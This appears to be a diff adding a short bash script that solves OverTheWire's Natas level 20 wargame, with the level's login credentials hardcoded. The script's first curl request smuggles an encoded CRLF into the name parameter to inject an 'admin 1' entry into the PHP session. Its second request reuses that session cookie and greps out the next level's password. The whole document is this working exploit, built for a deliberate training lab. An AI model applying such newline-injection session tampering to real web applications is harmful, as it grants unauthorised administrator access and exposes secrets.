@@ -1,0 +1,7 @@
+#!/bin/bash
+
+# override the session first, succedding request will display the password
+
+curl --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/index.php?name=admin%0D%0Aadmin+1 --cookie "PHPSESSID=xanything" > /dev/null 2>&1
+
+curl --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org --cookie "PHPSESSID=xanything" 2>&1 | grep Password | cut -d "<" -f1
